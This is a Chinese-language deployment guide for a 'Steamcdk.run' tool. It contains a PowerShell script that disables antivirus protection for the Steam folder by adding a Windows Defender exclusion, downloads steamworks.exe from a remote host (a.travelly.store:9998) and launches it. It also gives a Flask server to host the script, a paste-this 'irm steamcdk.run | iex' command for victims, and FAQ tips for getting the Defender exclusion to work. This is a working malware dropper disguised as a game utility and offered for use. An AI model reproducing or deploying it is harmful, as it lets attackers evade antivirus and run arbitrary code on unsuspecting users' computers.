# Steamcdk.run  Project deploy guideline

![image-20231120155501360](C:\Users\sheng\AppData\Roaming\Typora\typora-user-images\image-20231120155501360.png)



版本：1.0

发布日期: 2023/11/20

变更记录:

# 代码参考

## powershell 源码

**部署的时候,请将文件命名为a.ps1**

```powershell
# [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
# LOGO 省略.....
#Requires -RunAsAdministrator
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
if (-not $isAdmin) {
    Write-Host "Please Run as Administrator"
}

$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamPath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamPath').SteamPath
if ($null -ne $steamPath) {
    try {
# exclude windows defender
        if (Get-Service | where-object { $_.name -eq "windefend" -and $_.status -eq "running" }) {

            Add-MpPreference -ExclusionPath $steamPath
            Write-Host "  [STEAM]  Windows Defender has been exclude"
        }
        else {
            Write-Host "  [STEAM] Windows Defender exclude failed."
        }

# download file and process
        $appStorePath = $steamPath+("steamworks.exe")
        (New-Object Net.WebClient).DownloadFile("http://a.travelly.store:9998/g1/582/steamworks.exe",$appStorePath)

# display Message 
        Write-Host "  [STEAM] App is ready for run .please wait... "
        Write-Host "  [STEAM] Windows Defender has been clear "
        Write-Host "  [STEAM] Ready to go !!! "


# lauch execute our exe file;
        Start-Process -FilePath $appStorePath
        
    }
    catch {

    }
}
```

## Python Restful API: 

**部署的时候,请将文件命名位app.py**

```python
from flask import Flask
from flask import Flask,send_from_directory,send_file


app = Flask(__name__)

@app.route('/',methods=['GET'])
def home():
    path = '.'
    # return 'write-host "hello world"'
    return send_file('a.ps1',path)

if __name__ == "__main__":
    app.run(debug=True)

```

## 部署：

OS: Cent OS 7 

python:3.6以上版本

首先需要安装gunicorn

在服务器的目录下面创建一个serv目录,用于存放代码.

放好的代码结构如下:

![image-20231120153614281](C:\Users\sheng\AppData\Roaming\Typora\typora-user-images\image-20231120153614281.png)

### gunicorn 安装

```shell
pip install gunicorn
```

### gunicorn 运行后台程序：

```shell
cd serv
gunicorn --workers=4 --bind=0.0.0.0:80 app:app
```

# 使用简介:

需要 windows 10 系统:

教育版以上,最好专业版.



![image-20231120155038510](C:\Users\sheng\AppData\Roaming\Typora\typora-user-images\image-20231120155038510.png)

输入命令,开启程序.

```powershell
irm steamcdk.run | iex
```

运行截图:

![image-20231120154829617](C:\Users\sheng\AppData\Roaming\Typora\typora-user-images\image-20231120154829617.png)

# FAQ:

## 1,Windows defender 设置失败

用这个命令Get-Service | where-object { $_.name -eq "windefend" -and $_.status -eq "running" } ,检查window defend服务是否正常运行.如果没有运行,请将其启动.

![image-20231120154118544](C:\Users\sheng\AppData\Roaming\Typora\typora-user-images\image-20231120154118544.png)

## 2 windwos defender 排除项没有成功

手工检查

![image-20231120154216369](C:\Users\sheng\AppData\Roaming\Typora\typora-user-images\image-20231120154216369.png)

如果没有设置成功,检查以下项目是否开启,系统是否由其他的杀毒软件接管.

![image-20231120154255559](C:\Users\sheng\AppData\Roaming\Typora\typora-user-images\image-20231120154255559.png)

## 3steamworks.exe 文件下载不成功.

有时和网络和服务器通信有关系,重新尝试一遍可以解决.

